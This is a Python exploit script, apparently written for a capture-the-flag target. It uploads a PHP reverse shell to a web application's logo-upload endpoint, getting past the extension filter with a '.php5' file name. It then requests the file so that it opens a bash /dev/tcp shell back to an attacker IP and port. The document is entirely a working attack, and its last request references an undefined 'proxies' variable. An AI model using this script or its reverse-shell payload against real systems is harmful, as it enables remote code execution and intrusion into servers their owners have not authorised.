#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)

args = parser.parse_args()

s = requests.Session()

def shell(target, ip, port):

    url = "http://%s/sparklays/design/changelogo.php" % target 
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
    
    php_rev_shell = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1'\");"

    # This will be the element responsible for the filter bypass, the extension .php5
    filename = "shell.php5"
    files = {
        'file': (filename, php_rev_shell, 'application/x-php')
    }

    data = { "file" : files['file'], "submit" : "upload file" }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    print("[INFO] Trying to bypass the File Upload filter")

    r = s.post(url, headers=headers, files=files,  data= data) # proxies=proxies
    
    if "The file was uploaded successfully" in r.text:
        print("[SUCCESS] The reverse shell was uploaded successfully!")
    else:
        print("Upload failed!")

    shell_location = "http://%s/sparklays/design/uploads/%s" % (target, filename)

    print("[SUCCESS] The reverse shell was found on the /uploads directory. Check your callback at " + str(ip) + ":" + str(port) + " ;)")
    s.get(shell_location, proxies=proxies)


def main():
	shell(args.target, args.IP, args.port)


if __name__ == "__main__":
    main()
